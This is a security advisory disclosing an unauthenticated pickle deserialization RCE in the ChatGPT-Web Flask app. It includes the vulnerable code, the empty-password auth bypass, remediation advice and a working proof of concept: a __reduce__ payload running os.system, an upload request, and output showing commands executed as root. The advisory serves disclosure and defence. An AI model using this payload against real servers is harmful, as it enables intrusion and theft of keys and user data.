# VDR-020: Unauthenticated Pickle Deserialization RCE in LiangYang666/ChatGPT-Web

- **Target**: [LiangYang666/ChatGPT-Web](https://github.com/LiangYang666/ChatGPT-Web)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html) - Deserialization of Untrusted Data
- **CVE**: [CVE-2026-51089](https://www.cve.org/CVERecord?id=CVE-2026-51089)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Discovered**: 2026-04-14
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`ChatGPT-Web` is a Flask web front-end for the OpenAI API. Its `POST /uploadUserDictFile` endpoint accepts an uploaded `.pkl` file, writes it to a temporary path, and passes it straight to `pickle.load()`. Python's `pickle` executes the `__reduce__` method of any object it deserializes, so loading an attacker-uploaded pickle results in **arbitrary code execution** in the context of the server process. The `isinstance(upload_user_dict, LRUCache)` check runs *after* `pickle.load()` has already returned - i.e. after the payload has executed.

In the default configuration the endpoint is **unauthenticated**: `ADMIN_PASSWORD` defaults to the empty string (and falls back to `PASSWORD`, which also defaults to empty), so a request carrying an empty `admin-password` header satisfies the `admin-password != ADMIN_PASSWORD` gate.

A working proof of concept was executed against the **genuine, unmodified application** running under Python 3.11 on Linux. An unauthenticated multipart upload triggered the injected command `id` server-side, producing `uid=0(root) gid=0(root) groups=0(root)`.

## Affected Component

- **Product**: ChatGPT-Web (Flask web UI for the OpenAI API)
- **Commit**: `e5f69e2` (2023-09-12, tip of `main`)
- **Vulnerable file**: `main.py`
- **Endpoint**: `POST /uploadUserDictFile`
- **Sink**: `main.py:439` (and the equivalent `main.py:404`)

### Sink and its too-late guard - `main.py:428-446`

```python
if request.headers.get("admin-password") != ADMIN_PASSWORD:   # 428 - bypassed when ADMIN_PASSWORD==""
    return "..."
if not file.filename.endswith(".pkl"):                        # 430 - attacker names the file x.pkl
    return "..."
with tempfile.NamedTemporaryFile(suffix='.pkl', delete=False, mode='wb') as temp_file:
    file.save(temp_file.name)                                 # 435 - attacker bytes written to disk
try:
    with open(temp_file.name, 'rb') as temp_file:
        upload_user_dict = pickle.load(temp_file)             # 439 - SINK (code executes here)
except:
    return "..."
finally:
    os.remove(temp_file.name)
if not isinstance(upload_user_dict, LRUCache):                # 445 - runs AFTER the payload
    return "..."
```

### Default-unauthenticated - `main.py:39-60`

`PASSWORD` and `ADMIN_PASSWORD` default to `""` when not set in `data/config.yaml`; `ADMIN_PASSWORD` additionally falls back to `PASSWORD` when empty. A default deployment (operator sets only `OPENAI_API_KEY`) therefore accepts an empty `admin-password` header.

## Details

`pickle.load()` on untrusted data is unsafe by design: during unpickling, Python invokes the callable returned by an object's `__reduce__`. A pickle whose `__reduce__` returns `(os.system, ("<command>",))` runs `<command>` at load time. Because the endpoint stores the raw uploaded bytes and loads them with `pickle.load()`, and because the object-type check happens only afterwards, an unauthenticated attacker achieves remote code execution with a single multipart upload.

## Proof of Concept

The PoC runs the **genuine, unmodified `main.py`** as a Flask server in an isolated `python:3.11-slim` container (only `data/config.yaml` is provided, with a dummy `OPENAI_API_KEY` and no passwords, matching a default deployment). It then sends one unauthenticated HTTP request.

### Exploit request

`POST /uploadUserDictFile` with header `admin-password:` (empty) and a multipart file `x.pkl` whose content is `pickle.dumps(E())`, where:

```python
class E:
    def __reduce__(self):
        return (os.system, ("id > /tmp/PWNED_CHATGPTWEB 2>&1",))
```

### Captured transcript (`poc/OUTPUT.txt`)

```
== uploading malicious x.pkl to POST /uploadUserDictFile with empty admin-password (default ADMIN_PASSWORD='') ==
HTTP 200 | body: 上传文件格式错误，无法合并用户记录

== server-side proof: sentinel written by injected command (via genuine pickle.load) ==
uid=0(root) gid=0(root) groups=0(root)

[PROVEN] arbitrary OS command executed via pickle.load of an unauthenticated .pkl upload.
```

Note that the HTTP body reports a "wrong format" error - that is the `isinstance(..., LRUCache)` rejection at line 445, which fires **after** `pickle.load()` has already executed the payload. The sentinel file, containing the genuine output of `id`, is the authoritative proof that the injected command ran on the server as `root`. The runnable exploit is `poc/exploit.py`, driven by `poc/run.sh`; the full transcript is `poc/OUTPUT.txt`.

## Impact

An unauthenticated remote attacker who can reach the service can execute arbitrary OS commands in the context of the server process (observed as `root` in the PoC): full read/write/destroy of accessible files (including the operator's OpenAI API key and stored user data), persistence, and internal pivoting. With a default (password-less) deployment and a single request, the CVSS 3.1 base score is **9.8 (Critical)**, vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

## Recommendation

1. **Do not `pickle.load()` untrusted input.** Replace the pickle-based user-dictionary import/export with a safe serialization format (JSON) over primitive types, and reconstruct the `LRUCache` explicitly from validated data.
2. **Validate before deserializing, not after.** Object-type or schema checks must gate the data before any code-executing parse.
3. **Fail closed on authentication.** An empty configured password should disable the privileged endpoints, not open them; require a non-empty `ADMIN_PASSWORD` for `/uploadUserDictFile`.
4. **Run as an unprivileged user** and bind to `127.0.0.1` unless remote access is explicitly required.

## Status

| Date | Event |
|------|-------|
| 2026-04-14 | Vulnerability reported to MITRE CNA-LR (request 2025339, source-code audit) |
| 2026-07-01 | CVE-2026-51089 assigned by MITRE (RESERVED) |
| 2026-07-02 | Working end-to-end PoC executed against the genuine Flask application |

## References

- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [Upstream repository](https://github.com/LiangYang666/ChatGPT-Web)
- [Python `pickle` - "not secure against erroneous or maliciously constructed data"](https://docs.python.org/3/library/pickle.html)
